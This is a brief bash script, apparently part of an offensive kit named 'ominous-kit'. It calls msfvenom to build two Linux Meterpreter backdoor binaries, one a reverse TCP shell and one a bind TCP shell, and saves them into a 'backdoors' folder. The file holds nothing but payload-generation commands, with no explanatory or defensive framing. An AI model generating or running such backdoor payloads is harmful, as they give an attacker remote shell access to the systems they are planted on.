#!/bin/bash
#Reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf -o ./ominous-kit/backdoors/meterpreter/reverse.elf
#Bind shell
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=9001 -f elf -o ./ominous-kit/backdoors/meterpreter/bind.elf